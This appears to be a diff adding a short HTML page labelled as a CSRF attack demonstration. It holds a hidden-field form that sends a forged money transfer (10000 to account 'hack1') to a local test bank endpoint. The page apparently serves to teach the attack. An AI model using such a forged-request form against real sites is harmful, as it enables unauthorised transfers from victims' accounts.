@@ -1,0 +1,15 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <meta charset="GBK">
+    <title>CSRF攻击演示</title>
+</head>
+<body>
+<form action="http://localhost:8080/transfer" method="get">
+    <input type="hidden" value="hack1" name="account">
+    <input type="hidden" value="10000" name="money">
+    <input type="submit" value="如果访问过银行网站，点击我，触发CSRF，自动转账">
+</form>
+</body>
+</html>
+
